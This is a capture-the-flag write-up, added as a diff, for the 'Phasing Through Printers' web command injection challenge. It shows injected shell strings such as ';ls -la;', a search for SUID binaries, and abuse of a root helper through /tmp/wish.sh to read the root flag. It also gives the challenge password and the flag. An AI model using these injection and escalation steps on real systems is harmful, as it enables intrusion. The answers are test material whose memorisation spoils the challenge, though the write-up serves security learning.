@@ -1,0 +1,101 @@
+<h1 id="-phasing-through-printers">📦 Phasing Through Printers</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Category</th>
+      <th>Author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>📦 Miscellaneous</td>
+      <td>Soups71</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<p>I found this printer on the network, and it seems to be running… a weird web page… to search for drivers?</p>
+
+<p>Here is some of the code I could dig up.</p>
+
+<blockquote>
+  <p>[!NOTE]
+Escalate your privileges and uncover the flag in the root user’s home directory.</p>
+</blockquote>
+
+<h2 id="password">Password</h2>
+<blockquote>
+  <p>[!IMPORTANT]
+The password to the ZIP archive below is <code class="language-plaintext highlighter-rouge">phasing_through_printers</code>.</p>
+</blockquote>
+
+<h2 id="problem-type">Problem Type</h2>
+<ul>
+  <li>Web command injection</li>
+</ul>
+
+<h2 id="solve">Solve</h2>
+<p>Started off by trying to break out of the prompt with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">ls</span> <span class="nt">-la</span>
+</code></pre></div></div>
+
+<p>I noticed this only gave me the printer file and not the root folders too:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-r--r-- 1 www-data www-data 952 Sep 29 01:38 /var/www/html/data/printer_drivers.txt
+</code></pre></div></div>
+
+<p>So I tried adding an ending <code class="language-plaintext highlighter-rouge">;</code> as well:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">ls</span> <span class="nt">-la</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Much better:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 40
+drwxr-xr-x 1 root root 4096 Oct 22 02:05 .
+drwxr-xr-x 1 root root 4096 Oct 22 02:04 ..
+-rw------- 1 root root 2296 Sep 28 15:32 search.c
+-rwxr-xr-x 1 root root 16704 Oct 22 02:05 search.cgi
+</code></pre></div></div>
+
+<p>Tried looking for SUID:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-04000</span> <span class="nt">-ls</span> 2&gt;/dev/null<span class="p">;</span>
+</code></pre></div></div>
+
+<p>The last one <code class="language-plaintext highlighter-rouge">admin_help</code> is weird - in \usr\local\bin and not a normal binary:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>296563 60 -rwsr-xr-x 1 root root 59704 Nov 21 2024 /usr/bin/mount
+296438 64 -rwsr-xr-x 1 root root 62672 Apr 7 2025 /usr/bin/chfn
+296579 68 -rwsr-xr-x 1 root root 68248 Apr 7 2025 /usr/bin/passwd
+296655 36 -rwsr-xr-x 1 root root 35128 Nov 21 2024 /usr/bin/umount
+296505 88 -rwsr-xr-x 1 root root 88496 Apr 7 2025 /usr/bin/gpasswd
+296631 72 -rwsr-xr-x 1 root root 72000 Nov 21 2024 /usr/bin/su
+296568 48 -rwsr-xr-x 1 root root 48896 Apr 7 2025 /usr/bin/newgrp
+296444 52 -rwsr-xr-x 1 root root 52880 Apr 7 2025 /usr/bin/chsh
+300643 20 -rwsr-xr-x 1 root root 16416 Oct 22 02:05 /usr/local/bin/admin_help
+</code></pre></div></div>
+
+<p>Ran <code class="language-plaintext highlighter-rouge">strings</code> on it to see what it does:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span>strings /usr/local/bin/admin_help<span class="p">;</span>
+</code></pre></div></div>
+
+<p>The important part:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Error opening original file
+Bad String in File.
+Your wish is my command... maybe :)
+chmod +x /tmp/wish.sh &amp;&amp; /tmp/wish.sh
+</code></pre></div></div>
+
+<p>So it will make the <code class="language-plaintext highlighter-rouge">wish.sh</code> file in the <code class="language-plaintext highlighter-rouge">/tmp/</code> folder executable and then run it.</p>
+
+<p>We can exploit that:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">echo</span> <span class="s2">"cat /root/flag.txt"</span> <span class="o">&gt;</span> /tmp/wish.sh<span class="p">;</span>admin_help<span class="p">;</span>
+</code></pre></div></div>
+
+<p>That gives us back:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag{93541544b91b7d2b9d61e90becbca309}Your wish is my command... maybe :)
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">flag{93541544b91b7d2b9d61e90becbca309}</code></p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
